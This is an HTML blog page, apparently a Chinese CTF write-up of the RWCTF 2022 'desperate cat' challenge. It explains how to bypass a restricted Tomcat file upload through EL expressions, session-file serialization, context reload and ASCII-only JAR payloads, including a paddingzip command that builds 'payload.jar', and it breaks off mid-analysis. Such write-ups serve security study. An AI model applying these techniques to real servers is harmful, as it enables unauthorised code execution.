@@ -1,0 +1,2477 @@
+<!DOCTYPE html>
+<html>
+  <!-- meta/link... -->
+  
+
+
+
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+  <title>Tomcat下SpEL的不出网利用 | Godown_blog</title>
+
+  <link rel="icon" type="image/x-icon, image/vnd.microsoft.icon" href="/favicon.ico">
+  <link rel="stylesheet" href="https://at.alicdn.com/t/font_1911880_c1nvbyezg17.css">
+  <link href="https://unpkg.com/@fortawesome/fontawesome-free/css/all.min.css" rel="stylesheet">
+  <link href="/js/swiper/swiper@5.4.1.min.css" rel="stylesheet">
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/animate.min.css">
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+    <link href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0/dist/fancybox/fancybox.css" rel="stylesheet">
+  
+  
+    
+<link rel="stylesheet" href="/js/shareJs/share.min.css">
+
+  
+  <style>
+        @media (max-width: 992px) {
+            #waifu {
+                display: none;
+            }
+        }
+    </style>
+    <script defer src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/pink/pace-theme-flash.css" rel="stylesheet">
+
+    
+    
+    <!-- 依赖于jquery和vue -->
+    
+        <script src="https://unpkg.com/jquery@3.5.1/dist/jquery.min.js"></script>
+    
+
+    
+        <script src="https://unpkg.com/vue@2.6.11/dist/vue.min.js"></script>
+    
+
+    <!-- import link -->
+    
+        
+            
+        
+            
+        
+    
+    <!-- import script -->
+    
+        
+            
+        
+            
+        
+    
+
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Godown_blog" type="application/atom+xml">
+</head>
+
+  
+  <!-- 预加载动画 -->
+  <!-- 页面预加载动画 -->
+
+  
+    <div class="preloader_2" id="loader">
+  <div class="loader"></div>
+</div>
+
+  
+<script>
+  var endLoading = function () {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loader').classList.add("loading");
+  }
+  window.addEventListener('DOMContentLoaded',endLoading);
+</script>
+
+  <body>
+    <!-- 判断是否为暗黑风格 -->
+    <!-- 判断是否为黑夜模式 -->
+<script>
+  let isDark = JSON.parse(localStorage.getItem('dark')) || JSON.parse('false');
+
+  if (isDark) {
+    $(document.body).addClass('darkModel');
+  }
+</script>
+
+    <!-- 需要在上面加载的js -->
+    <script>
+  function loadScript(src, cb) {
+    return new Promise(resolve => {
+      setTimeout(function () {
+        var HEAD = document.getElementsByTagName("head")[0] || document.documentElement;
+        var script = document.createElement("script");
+        script.setAttribute("type", "text/javascript");
+        if (cb) {
+          if (JSON.stringify(cb)) {
+            for (let p in cb) {
+              if (p == "onload") {
+                script[p] = () => {
+                  cb[p]()
+                  resolve()
+                }
+              } else {
+                script[p] = cb[p]
+                script.onload = resolve
+              }
+            }
+          } else {
+            script.onload = () => {
+              cb()
+              resolve()
+            };
+          }
+        } else {
+          script.onload = resolve
+        }
+        script.setAttribute("src", src);
+        HEAD.appendChild(script);
+      });
+    });
+  }
+
+  //https://github.com/filamentgroup/loadCSS
+  var loadCSS = function (src) {
+    return new Promise(resolve => {
+      setTimeout(function () {
+        var link = document.createElement('link');
+        link.rel = "stylesheet";
+        link.href = src;
+        link.onload = resolve;
+        document.getElementsByTagName("head")[0].appendChild(link);
+      });
+    });
+  };
+
+</script> 
+
+<!-- 轮播图所需要的js -->
+<script src="/js/swiper/swiper.min.js"></script>
+<script src="/js/swiper/vue-awesome-swiper.js"></script>
+<script src="/js/swiper/swiper.animate1.0.3.min.js"></script>
+
+<script type="text/javascript">
+  Vue.use(window.VueAwesomeSwiper)
+</script>
+
+
+  <script src="/js/vue-typed-js/index.js"></script>
+
+
+<!-- 首页的公告滚动插件的js需要重新加载 -->
+<script src="/js/vue-seamless-scroll/index.js"></script>
+
+<!-- 打字机效果js -->
+<script src="https://unpkg.com/typed.js@2.0.11"></script>
+
+
+    <div id="safearea">
+      <main class="main" id="pjax-container">
+        <!-- 头部导航 -->
+        
+<header class="header  " 
+  id="navHeader"
+  style="position: fixed;
+  left: 0; top: 0; z-index: 10;width: 100%;"
+>
+  <div class="header-content">
+    <div class="bars">
+      <div id="appDrawer" class="sidebar-image">
+  <div class="drawer-box-icon">
+    <i class="fas fa-bars" aria-hidden="true" @click="showDialogDrawer"></i>
+  </div>
+  
+  <transition name="fade">
+    <div class="drawer-box_mask" v-cloak style="display: none;" v-show="visible" @click.self="cancelDialogDrawer">
+    </div>
+  </transition>
+  <div class="drawer-box" :class="{'active': visible}">
+    <div class="drawer-box-head bg-color">
+      <img class="drawer-box-head_logo lazyload placeholder" src="/medias/logo.png" class="lazyload placeholder" data-srcset="/medias/logo.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="logo">
+      <h3 class="drawer-box-head_title">Godown_blog</h3>
+      <h5 class="drawer-box-head_desc">山水为竭，冬雷震震</h5>
+    </div>
+    
+    <div class="drawer-box-content">
+      <ul class="drawer-box-content_menu">
+        
+          
+            <li class="drawer-box-content_item" style="position: relative;">
+              
+                <a href="/" class="drawer-menu-item-link">
+                  
+                    <i class="fas fa-home" aria-hidden="true"></i>
+                  
+                  <span class="name">首页</span>
+                </a>
+              
+            </li>
+          
+            <li class="drawer-box-content_item" style="position: relative;">
+              
+                <a href="/archives" class="drawer-menu-item-link">
+                  
+                    <i class="fas fa-archive" aria-hidden="true"></i>
+                  
+                  <span class="name">归档</span>
+                </a>
+              
+            </li>
+          
+            <li class="drawer-box-content_item" style="position: relative;">
+              
+                <a href="/tags" class="drawer-menu-item-link">
+                  
+                    <i class="fas fa-tags" aria-hidden="true"></i>
+                  
+                  <span class="name">标签</span>
+                </a>
+              
+            </li>
+          
+            <li class="drawer-box-content_item" style="position: relative;">
+              
+                <a href="/categories" class="drawer-menu-item-link">
+                  
+                    <i class="fas fa-bookmark" aria-hidden="true"></i>
+                  
+                  <span class="name">分类</span>
+                </a>
+              
+            </li>
+          
+            <li class="drawer-box-content_item" style="position: relative;">
+              
+                <a href="/friends" class="drawer-menu-item-link">
+                  
+                  <span class="name">友情链接</span>
+                </a>
+              
+            </li>
+          
+            <li class="drawer-box-content_item" style="position: relative;">
+              
+                <a href="javascript:;" class="drawer-menu-item-link has-children" @click="openOrCloseMenu(5)">
+                  <span>
+                    
+                      <i class="fas fa-link"></i>
+                    
+                    <span class="name">更多</span>
+                  </span>
+                  <i class="fas fa-chevron-left arrow " :class="{'icon-rotate': isOpen(5)}" aria-hidden="true"></i>
+                </a>
+                <ul class="drawer-sub-menu" v-if="isOpen(5)">
+                  
+                  <li>
+                    <a href="/gallery">
+                      
+                      <i class="fas fa-music" style="margin-top: -20px;"></i>
+                      
+                      <span>图库</span>
+                    </a>
+                  </li>
+                  
+                  <li>
+                    <a href="/friends">
+                      
+                      <i class="fas fa-film" style="margin-top: -20px;"></i>
+                      
+                      <span>友情连接</span>
+                    </a>
+                  </li>
+                  
+                  <li>
+                    <a href="/about">
+                      
+                      <i class="fas fa-film" style="margin-top: -20px;"></i>
+                      
+                      <span>关于我</span>
+                    </a>
+                  </li>
+                  
+                  <li>
+                    <a target="_blank" rel="noopener" href="http://baidu.com">
+                      
+                      <i class="fas fa-film" style="margin-top: -20px;"></i>
+                      
+                      <span>百度</span>
+                    </a>
+                  </li>
+                  
+                </ul>
+              
+            </li>
+          
+        
+        
+          <li class="drawer-box-content_item">
+            <a target="_blank" rel="noopener" href="https://github.com/godownio">
+              <i class="fas fa-github" aria-hidden="true"></i>
+              <span>Github</span>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</div>
+
+<script>
+  var body = document.body || document.documentElement || window;
+  var vm = new Vue({
+    el: '#appDrawer',
+    data: {
+      visible: false,
+      top: 0,
+      openArr: [],
+    },
+    computed: {
+    },
+    mounted() {
+    },
+    methods: {
+      isOpen(index) {
+        if (this.openArr.includes(index)) {
+          return true;
+        } else {
+          return false;
+        }
+      },
+      openOrCloseMenu(curIndex) {
+        const index = this.openArr.indexOf(curIndex);
+        if (index !== -1) {
+          this.openArr.splice(index, 1);
+        } else {
+          this.openArr.push(curIndex);
+        }
+      },
+      showDialogDrawer() {
+        this.visible = true;
+        // 防止页面滚动，只能让弹框滚动
+        this.top = $(document).scrollTop()
+        body.style.cssText = 'width: 100%; height: 100%;overflow: hidden;';
+      },
+      cancelDialogDrawer() {
+        this.visible = false;
+        body.removeAttribute('style');
+        $(document).scrollTop(this.top)
+      }
+    },
+    created() {}
+  })
+</script>
+
+    </div>
+    <div class="blog-title" id="author-avatar">
+      
+        <div class="avatar">
+          <img src="/medias/logo.png" class="lazyload placeholder" data-srcset="/medias/logo.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="logo">
+        </div>
+      
+      <a href="/" class="logo">Godown_blog</a>
+    </div>
+    <nav class="navbar">
+      <ul class="menu">
+        
+          
+            <li class="menu-item" style="position: relative;">
+              
+                <a href="/" class="menu-item-link" title="首页">
+                  
+                    <i class="fas fa-home" aria-hidden="true"></i>
+                  
+                  <span class="name">首页</span>
+                </a>
+              
+            </li>
+          
+            <li class="menu-item" style="position: relative;">
+              
+                <a href="/archives" class="menu-item-link" title="归档">
+                  
+                    <i class="fas fa-archive" aria-hidden="true"></i>
+                  
+                  <span class="name">归档</span>
+                </a>
+              
+            </li>
+          
+            <li class="menu-item" style="position: relative;">
+              
+                <a href="/tags" class="menu-item-link" title="标签">
+                  
+                    <i class="fas fa-tags" aria-hidden="true"></i>
+                  
+                  <span class="name">标签</span>
+                </a>
+              
+            </li>
+          
+            <li class="menu-item" style="position: relative;">
+              
+                <a href="/categories" class="menu-item-link" title="分类">
+                  
+                    <i class="fas fa-bookmark" aria-hidden="true"></i>
+                  
+                  <span class="name">分类</span>
+                </a>
+              
+            </li>
+          
+            <li class="menu-item" style="position: relative;">
+              
+                <a href="/friends" class="menu-item-link" title="友情链接">
+                  
+                  <span class="name">友情链接</span>
+                </a>
+              
+            </li>
+          
+            <li class="menu-item" style="position: relative;">
+              
+                <a href="javascript:;" class="menu-item-link" title="更多">
+                  
+                    <i class="fas fa-link"></i>
+                  
+                  <span class="name">更多</span>
+                  <i class="fas fa-chevron-down arrow" aria-hidden="true"></i>
+                </a>
+                <ul class="sub-menu">
+                  
+                  <li>
+                    <a href="/gallery">
+                      
+                      <i class="fas fa-music" style="margin-top: -20px;"></i>
+                      
+                      <span>图库</span>
+                    </a>
+                  </li>
+                  
+                  <li>
+                    <a href="/friends">
+                      
+                      <i class="fas fa-film" style="margin-top: -20px;"></i>
+                      
+                      <span>友情连接</span>
+                    </a>
+                  </li>
+                  
+                  <li>
+                    <a href="/about">
+                      
+                      <i class="fas fa-film" style="margin-top: -20px;"></i>
+                      
+                      <span>关于我</span>
+                    </a>
+                  </li>
+                  
+                  <li>
+                    <a target="_blank" rel="noopener" href="http://baidu.com">
+                      
+                      <i class="fas fa-film" style="margin-top: -20px;"></i>
+                      
+                      <span>百度</span>
+                    </a>
+                  </li>
+                  
+                </ul>
+              
+            </li>
+          
+        
+      </ul>
+      
+      
+        <div id="appSearch">
+  <div class="search"  @click="showDialog()"><i class="fas fa-search" aria-hidden="true"></i></div>
+  <transition name="fade">
+    <div class="message-box_wrapper" style="display: none;" v-cloak v-show="dialogVisible" @click.self="cancelDialogVisible()">
+      <div class="message-box animated bounceInDown">
+        <h2>
+          <span>
+            <i class="fas fa-search" aria-hidden="true"></i>
+            <span class="title">本地搜索</span>
+          </span>
+          <i class="fas fa-times close" pointer style="float:right;" aria-hidden="true" @click.self="cancelDialogVisible()"></i>
+        </h2>
+        <form class="site-search-form">
+          <input type="text"
+            placeholder="请输入关键字"
+            id="local-search-input" 
+            @click="getSearchFile()"
+            class="st-search-input"
+            v-model="searchInput"
+          />
+        </form>
+        <div class="result-wrapper">
+          <div id="local-search-result" class="local-search-result-cls"></div>
+        </div>
+      </div>
+    </div>
+  </transition>
+</div>
+<script src="/js/local_search.js"></script>
+<script>
+  var body = document.body || document.documentElement || window;
+  var vm = new Vue({
+    el: '#appSearch',
+    data: {
+      dialogVisible: false,
+      searchInput: '',
+      top: 0,
+    },
+    computed: {
+    },
+    mounted() {
+      window.addEventListener('pjax:complete', () => {
+        this.cancelDialogVisible();
+      })
+    },
+    methods: {
+      showDialog() {
+        this.dialogVisible = true;
+        // 防止页面滚动，只能让弹框滚动
+        this.top = $(document).scrollTop()
+        body.style.cssText = 'overflow: hidden;';
+      },
+      getSearchFile() {
+        if (!this.searchInput) {
+          getSearchFile("/search.xml");
+        }
+      },
+      cancelDialogVisible() {
+        this.dialogVisible = false;
+        body.removeAttribute('style');
+        $(document).scrollTop(this.top)
+      },
+    },
+    created() {}
+  })
+</script>
+<!-- 解决刷新页面闪烁问题，可以在元素上添加display: none, 或者用vue.extend方法，详情：https://blog.csdn.net/qq_31393401/article/details/81017912 -->
+<!-- 下面是搜索基本写法 -->
+<!-- <script type="text/javascript" id="local.search.active">
+  var inputArea = document.querySelector("#local-search-input");
+  inputArea.onclick   = function(){ getSearchFile(); this.onclick = null }
+  inputArea.onkeydown = function(){ if(event.keyCode == 13) return false }
+</script> -->
+
+      
+
+    </nav>
+  </div>
+  
+    <a target="_blank" rel="noopener" href="https://github.com/godownio" class="github-corner color-primary" aria-label="View source on GitHub"><svg width="60" height="60" viewBox="0 0 250 250" style="fill:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
+  
+  
+</header>
+        <!-- 内容区域 -->
+        
+ <!-- prismjs 代码高亮 -->
+ 
+
+
+<div class="bg-dark-floor" style="position: fixed;left: 0;top: 0;width: 100%;height: 100%;z-index: -1;"></div>
+
+
+  <!-- 文章详情页顶部图片和标题 -->
+
+
+
+
+<div class="post-detail-header" id="thumbnail_canvas" style="background-repeat: no-repeat; background-size: cover; 
+  background-position: center center;position: relative;background-image:url('https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8149.jpg')">
+  <div class="post-detail-header-mask"></div>
+  <canvas id="header_canvas"style="position:absolute;bottom:0;pointer-events:none;"></canvas>
+  
+  <div class="post-detail-header_info-box">
+    <div class="title-box">
+      <span class="title">
+        Tomcat下SpEL的不出网利用
+      </span>
+    </div>
+    
+    
+  </div>
+  
+  
+    <script src="/js/bubble/bubble.js"></script>
+  
+</div>
+
+
+
+
+
+<div class="post-detail-content post-row" 
+  style="padding-top: 0px;">
+  <div class="main-content">
+    <article class="post post-detail">
+      <div class="post-content">
+        <h1 id="2022RWCTF-desperate-cat-字符串写JAR文件和脏数据绕过"><a href="#2022RWCTF-desperate-cat-字符串写JAR文件和脏数据绕过" class="headerlink" title="2022RWCTF desperate cat 字符串写JAR文件和脏数据绕过"></a>2022RWCTF desperate cat 字符串写JAR文件和脏数据绕过</h1><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>我先把知识点放上来，方便后期复习查看，初看请略过</p>
+<p>Tomcat下JSP能执行<code>$&#123;&#125;</code>EL表达式</p>
+<p>Tomcat Session的load会序列化向临时目录写SESSION.ser文件，unload会反序列化SESSION.ser文件。StandardContext.reload会完成一次load-&gt;unload的重启</p>
+<p>reload的情况有两种：</p>
+<ul>
+<li>reloadable 为 true，web 应用中的资源文件（ .class 文件）有变动。 web 应用中&#x2F;WEB-INF&#x2F;lib的 jar 有变动</li>
+<li>WatchedResource有变动，Tomcat8.5.56下为<code>WEB-INF/web.xml</code>和<code>$&#123;catalina.base&#125;/conf/web.xml</code>，Tomcat9.0.56下会多监控一个<code>WEB-INF/tomcat-web.xml</code>，具体请见<code>your_Tomcat_home\conf\Catalina\localhost\manager.xml</code></li>
+</ul>
+<p>修改Tomcat appBase后reload会重新挂载资源目录</p>
+<p>Tomcat加载JAR失败并不会导致崩溃，而是继续加载其他JAR。</p>
+<p>JAR实际上是个ZIP，但是JAR必须包括中央目录项和EOCD块</p>
+<p>在文件上传漏洞点，但是受限为字符串形式时，如果需要上传JAR，可以考虑利用ascii-jar项目：</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/c0ny1/ascii-jar/blob/master/ascii-jar-1.py">https://github.com/c0ny1/ascii-jar/blob/master/ascii-jar-1.py</a></p>
+<p>如果需要将JSP包含在JAR包中的META-INF&#x2F;resources目录以供加载后直接访问，ascii-jar项目也提供了该demo：</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/c0ny1/ascii-jar/blob/master/ascii-jar-2.py">https://github.com/c0ny1/ascii-jar/blob/master/ascii-jar-2.py</a></p>
+<p>如果上传前后有脏数据，可以使用paddingzip项目：<a target="_blank" rel="noopener" href="https://github.com/c0ny1/ascii-jar/blob/master/paddingzip.py">https://github.com/c0ny1/ascii-jar/blob/master/paddingzip.py</a></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">python3 paddingzip.py -i ascii01.jar -o payload.jar -p <span class="string">&quot;DIRTY DATA AT THE BEGINNING &quot;</span> -a <span class="string">&quot;C0NY1 DIRTY DATA AT THE END&quot;</span></span></span><br><span class="line">file &#x27;payload.jar&#x27; is generated</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">修改offset后需要手动把脏数据外的jar数据抠出来</span></span><br></pre></td></tr></table></figure>
+
+<p>trim()会分离字符串首尾小于或等于<code>\u0020</code>的字符</p>
+<h2 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h2><p><a target="_blank" rel="noopener" href="https://github.com/voidfyoo/rwctf-4th-desperate-cat">https://github.com/voidfyoo/rwctf-4th-desperate-cat</a></p>
+<p>这道题的作者也是研究出fastjson1.2.68+commons-io写文件的作者，不得不佩服其想象力</p>
+<p>文章基于 RWCTF 2022 的一道题目，构建了一个受限的文件上传环境，具体限制包括：</p>
+<ol>
+<li>上传接口允许任意文件上传，且会递归创建目录。但会对文件名进行重命名；</li>
+<li>上传内容会被添加前后缀的“脏数据”；</li>
+<li>文件内容以 UTF-8 编码写入；</li>
+<li>对内容中的特殊字符如 <code>&amp; &lt; &#39; &gt; &quot; ( )</code> 进行了转义处理。</li>
+</ol>
+<p>这些限制使得传统的上传 WebShell 方法难以奏效，迫使研究者寻找新的绕过手段。</p>
+<p>在代码上，“脏数据”是在数据前后加入的<code>DIRTY DATA AT THE BEGINNING</code>和<code>DIRTY DATA AT THE END</code></p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/1671784782598.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/1671784782598.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="1671784782598"></p>
+<p>我们的目的是想办法上传一个jsp文件，且不受文件内容限制，如过滤和脏数据。</p>
+<p>首先Tomcat只有catalina包是无法解析jsp的，但是我们是在运行处指定了服务器。虽然maven只导入了catalina，但是依旧能顺利解析jsp</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250420150142882.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250420150142882.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250420150142882"></p>
+<p>要调试jsp的解析，应该加上jasper的依赖</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-jasper<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>8.5.56<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="解法1：EL-session序列化写文件"><a href="#解法1：EL-session序列化写文件" class="headerlink" title="解法1：EL+session序列化写文件"></a>解法1：EL+session序列化写文件</h2><p>直接通过该场景的文件上传场景会有诸多限制，有没有办法通过这个受限场景找到一个不受限的文件上传点？</p>
+<p><code>org.apache.catalina.Manager</code> 是 Tomcat 中的一个接口，用于<strong>管理 Web 应用的会话（Session）</strong></p>
+<p>常见的 <code>Manager</code> 实现类包括：</p>
+<ul>
+<li><code>org.apache.catalina.session.StandardManager</code>（默认的）</li>
+<li><code>org.apache.catalina.session.PersistentManager</code>（带磁盘持久化）</li>
+</ul>
+<p>也可以自定义Manager的实现，比如做会话复制、加密等</p>
+<p>这里详细介绍一下默认的StandardManager</p>
+<p>在StandardContext.startInternal中，如果没有手动配置Manager(getCluster()&#x3D;&#x3D;null)，Tomcat会默认实例化一个StandardManager</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250420124135234.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250420124135234.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250420124135234"></p>
+<p>接着在startInternal中，调用LifecycleBase.start</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250420125220730.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250420125220730.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250420125220730"></p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250420125305738.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250420125305738.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250420125305738"></p>
+<p>LifecycleBase.start-&gt;startInternal-&gt;StandardManager.load</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250420125404609.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250420125404609.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250420125404609"></p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250420125415899.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250420125415899.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250420125415899"></p>
+<p>load-&gt;doLoad，doLoad调用file方法获取持久化文件路径，并读取文件，通过该文件逐一对会话进行反序列化，并激活会话。</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250420125949773.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250420125949773.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250420125949773"></p>
+<p>通过查看file函数，得知文件名存储在pathname里，默认为SESSIONS.ser，且位于临时目录。临时目录的值来自于ServletContext.TEMPDIR</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250420130214657.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250420130214657.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250420130214657"></p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250420130925933.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250420130925933.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250420130925933"></p>
+<p>现在不是很关心反序列化的点。具体可以搜索CVE-2020-9484，主要是没有漏洞依赖，打不了原生反序列化，另一个原因后面说</p>
+<p>既然存在反序列化的过程，那就肯定有序列化的过程</p>
+<p>StandardManager.stopInternal调用了unload()方法</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250420152215097.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250420152215097.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250420152215097"></p>
+<p>unload-&gt;doUnload，依旧用file获取了临时目录下的SESSION.ser文件，然后将当前session逐一序列化进文件</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250420152359456.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250420152359456.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250420152359456"></p>
+<p>不过这种操作需要重启Tomcat，有没有办法不重启，触发到序列化呢？</p>
+<p>StandardContext提供了一个reload方法，完成了一次对Lifecycle的stop-&gt;start，程序运行时重启。</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250420155053236.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250420155053236.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250420155053236"></p>
+<p>Tomcat启动时，会调用ContainerBase#startInternal，进而调用threadStart</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250420202312846.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250420202312846.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250420202312846"></p>
+<p>threadStart创建了一个后台线程ContainerBackgroundProcessor</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250420203114276.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250420203114276.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250420203114276"></p>
+<p>该线程会定时（默认10s）执行调用processChildren</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250420203544785.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250420203544785.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250420203544785"></p>
+<p>processChild遍历container的子容器，调用backgroundProcess。众所周知Container的子容器会包括Engine、Host、Context、Wrapper。</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250420204800188.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250420204800188.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250420204800188"></p>
+<p>跟进到StandardContext.backgroundProcess。分别调用了loader、manager、resources、instanceManager的backgroundProcess方法</p>
